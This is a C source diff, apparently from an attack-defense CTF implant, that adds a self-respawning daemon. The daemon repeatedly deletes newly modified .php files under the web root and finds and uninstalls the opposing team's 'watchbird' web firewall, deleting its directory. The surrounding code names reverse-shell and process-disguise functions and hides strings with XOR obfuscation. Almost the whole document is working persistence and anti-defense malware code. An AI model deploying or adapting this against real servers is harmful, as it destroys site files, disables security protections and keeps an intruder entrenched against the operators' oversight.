@@ -34,6 +34,7 @@ void ChangeProcessName(char **argv, const char *name);
 pid_t spawn_anchor(char **argv);
 void ServeFlagUDP();
 void WebFlagRoutine();
+void WebCleanRoutine();
 void ReadFlag();
 void ReverseFlag();
 /*
@@ -387,6 +388,141 @@ void ReverseShell(int cur_idx, char **argv)
 }
 
 /*
+ * ── WEB 题清理守护进程 ──────────────────────────────────────
+ *
+ * 被 guard/main 共同守护（被杀自动重启），死循环执行：
+ *   1. 递归扫描 WWWROOT，删除「修改时间 > xsh 启动时间」的 .php 文件
+ *      （自己实现目录遍历，不依赖外部命令）
+ *   2. 检查 /tmp 是否有 watchbird 目录（敌方 WAF），若有则：
+ *      a. 找到 WWWROOT/watchbird.php，执行 php watchbird.php --uninstall
+ *      b. 删除 /tmp/watchbird 目录
+ */
+
+/* 递归删除目录（rm -rf 的 C 实现） */
+static void rmdir_recursive(const char *path)
+{
+    DIR *d = opendir(path);
+    if (!d) { remove(path); return; }
+
+    struct dirent *ent;
+    char child[1024];
+    while ((ent = readdir(d)) != NULL)
+    {
+        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
+            continue;
+        snprintf(child, sizeof(child), "%s/%s", path, ent->d_name);
+        struct stat st;
+        if (lstat(child, &st) == 0 && S_ISDIR(st.st_mode))
+            rmdir_recursive(child);
+        else
+            remove(child);
+    }
+    closedir(d);
+    rmdir(path);
+}
+
+/*
+ * scan_and_clean_php：递归扫描目录，删除 mtime > boot_time 的 .php 文件。
+ * 跳过我们自己放置的 .xia0ji233 目录。
+ */
+static void scan_and_clean_php(const char *dir, time_t boot_time)
+{
+    DIR *d = opendir(dir);
+    if (!d) return;
+
+    struct dirent *ent;
+    char path[1024];
+    while ((ent = readdir(d)) != NULL)
+    {
+        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
+            continue;
+        /* 跳过我们自己的目录 */
+        if (strcmp(ent->d_name, ".xia0ji233") == 0)
+            continue;
+
+        snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
+        struct stat st;
+        if (lstat(path, &st) != 0)
+            continue;
+
+        if (S_ISDIR(st.st_mode))
+        {
+            scan_and_clean_php(path, boot_time);
+        }
+        else if (S_ISREG(st.st_mode))
+        {
+            /* 检查是否为 .php 文件且 mtime > boot_time */
+            int namelen = strlen(ent->d_name);
+            if (namelen >= 4 &&
+                strcmp(ent->d_name + namelen - 4, ".php") == 0 &&
+                st.st_mtime > boot_time)
+            {
+                remove(path);
+            }
+        }
+    }
+    closedir(d);
+}
+
+/*
+ * uninstall_enemy_watchbird：卸载敌方部署的 watchbird WAF。
+ *   1. 查找 WWWROOT/watchbird.php，执行 --uninstall
+ *   2. 递归删除 /tmp/watchbird 目录（配置文件所在位置）
+ */
+static void uninstall_enemy_watchbird()
+{
+    char wb_php[512];
+    snprintf(wb_php, sizeof(wb_php), "%swatchbird.php", XorString(WWWROOT));
+
+    struct stat st;
+    if (stat(wb_php, &st) == 0 && S_ISREG(st.st_mode))
+    {
+        /* php /var/www/html/watchbird.php --uninstall */
+        pid_t p = fork();
+        if (p == 0)
+        {
+            execl(XorString("/usr/bin/php"), "php", wb_php,
+                  XorString("--uninstall"), NULL);
+            /* 某些环境 php 在 /usr/local/bin */
+            execl(XorString("/usr/local/bin/php"), "php", wb_php,
+                  XorString("--uninstall"), NULL);
+            _exit(127);
+        }
+        if (p > 0)
+        {
+            int status;
+            waitpid(p, &status, 0);
+        }
+    }
+
+    /* 删除 /tmp/watchbird 目录 */
+    rmdir_recursive(XorString("/tmp/watchbird"));
+}
+
+/*
+ * WebCleanRoutine：WEB 题清理守护主循环（独立子进程运行，永不返回）。
+ */
+void WebCleanRoutine()
+{
+    time_t boot_time = time(NULL);
+
+    for (;;)
+    {
+        /* 1. 扫描删除新增的 .php 文件 */
+        scan_and_clean_php(XorString(WWWROOT), boot_time);
+
+        /* 2. 检查并清理敌方 watchbird */
+        struct stat st;
+        if (stat(XorString("/tmp/watchbird"), &st) == 0 && S_ISDIR(st.st_mode))
+        {
+            uninstall_enemy_watchbird();
+        }
+
+        sleep(5); /* 每 5 秒巡检一次 */
+    }
+}
+
+/*
  * WebFlagRoutine（Web 题专用，独立子进程运行）：
  *
  * 初始化（只执行一次）：
@@ -470,6 +606,13 @@ void do_work(char **argv)
         WebFlagRoutine(); /* 永不返回 */
         _exit(0);
     }
+    pid_t pid_c = fork();
+    if (pid_c == 0)
+    {
+        setpgid(0, 0);
+        WebCleanRoutine(); /* 永不返回 */
+        _exit(0);
+    }
 #endif
 
 #if (SERVE_FLAG)
@@ -499,6 +642,17 @@ void do_work(char **argv)
             {
                 setpgid(0, 0);
                 WebFlagRoutine();
+                _exit(0);
+            }
+        }
+        /* 监控 WebCleanRoutine 子进程 */
+        if (pid_c > 0 && kill(pid_c, 0) != 0)
+        {
+            pid_c = fork();
+            if (pid_c == 0)
+            {
+                setpgid(0, 0);
+                WebCleanRoutine();
                 _exit(0);
             }
         }
